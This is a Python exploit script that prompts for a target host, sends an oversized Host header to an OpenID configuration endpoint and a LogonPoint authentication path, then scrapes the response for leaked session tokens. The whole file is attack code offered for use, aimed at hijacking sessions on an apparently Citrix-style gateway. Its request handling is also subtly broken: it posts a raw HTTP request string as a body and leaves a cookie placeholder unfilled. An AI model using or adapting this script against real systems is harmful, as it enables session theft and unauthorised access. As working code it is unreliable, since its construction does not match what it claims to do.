#!/usr/bin/env python

# banner.py

import re
import requests
import random  # Import the random module
import string

# Define the variables
payload = 'a' * 24812
rand_text_alpha = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))

# Ask the user to enter the target asset or IP address
target_hostname = input("Enter the target asset or IP address: ")

# Define the session token regular expression pattern
session_token_pattern = r'\b([a-f0-9]{65})\b'

# Define the HTTP request headers
headers = {
    'User-Agent': 'python-requests/2.25.1',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept': '*/*',
    'Connection': 'close',
    'Content-Length': '0',
}

# Define the HTTP request for sensitive information disclosure
http_request = f"""
GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
{rand_text_alpha}: {target_hostname}
Host: {payload}

POST /logon/LogonPoint/Authentication/GetUserName HTTP/1.1
Host: {target_hostname}
Cookie: NSC_AAAC={{session}}
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 0
"""

# Send the HTTP request
response = requests.post(target_hostname, data=http_request, headers=headers)

# Extract the session token using regular expression
session_token_match = re.search(session_token_pattern, response.text)
if session_token_match:
    session_token = session_token_match.group(1)
    print(f"Session Token: {session_token}")

# Check for specific words in the response to determine if exploitation was successful
if "NSC_AAAC=" in response.text and '{"issuer":' in response.text:
    print("Vulnerability Exploited: Sensitive information disclosure")
else:
    print("Exploitation failed")
